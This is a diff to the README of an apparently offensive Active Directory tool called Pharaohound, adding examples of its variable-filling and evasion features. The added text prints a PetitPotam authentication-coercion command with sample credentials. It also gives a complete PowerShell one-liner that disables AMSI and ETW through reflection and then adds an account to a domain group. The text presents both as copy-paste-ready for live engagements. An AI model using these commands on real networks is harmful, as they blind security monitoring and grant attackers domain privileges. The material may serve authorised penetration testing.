@@ -186,7 +186,41 @@ Pharaohound allows operators to supply a variables file to replace default comma
 python pharaohound.py testCase --all --vars variables.json
 ```
 
-Output commands will automatically render with the custom variables populated, making it copy-paste-ready.
+Output commands will automatically render with the custom variables populated, making them 100% copy-paste-ready for your terminal.
+
+### Example: Before and After Interpolation
+
+**1. Standard Output (Without `--vars`)**
+When running without variables, Pharaohound provides the exact syntax but leaves placeholders for you to fill in:
+```bash
+python pharaohound.py testCase --all
+```
+*Generated Command:*
+```bash
+python3 PetitPotam.py -u '<DOMAIN_USER>' -p '<PASSWORD>' <UD_HOST> <DC_IP>
+```
+
+**2. Interpolated Output (With `--vars`)**
+When you provide the `vars.json` file, the engine automatically replaces the placeholders with your live engagement data:
+```bash
+python pharaohound.py testCase --all --vars vars.json
+```
+*Generated Command (Copy-Paste Ready):*
+```bash
+python3 PetitPotam.py -u 'Administrator' -p 'Password123!' <UD_HOST> 10.10.10.10
+```
+*(Notice how `<DOMAIN_USER>`, `<PASSWORD>`, and `<DC_IP>` were automatically mapped from the JSON file!)*
+
+### Example: Combining Variables with Evasion (`--evasion`)
+For maximum operational efficiency, combine variable interpolation with the evasion engine. Pharaohound will fill in your passwords/IPs *and* inject AMSI/ETW bypasses into PowerShell playbooks:
+
+```bash
+python pharaohound.py testCase --all --vars vars.json --evasion
+```
+*Generated Command (Copy-Paste Ready & Evasive):*
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([System.Diagnostics.Eventing.EventProvider],0); Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members 'Administrator'
+```
 
 ---
 
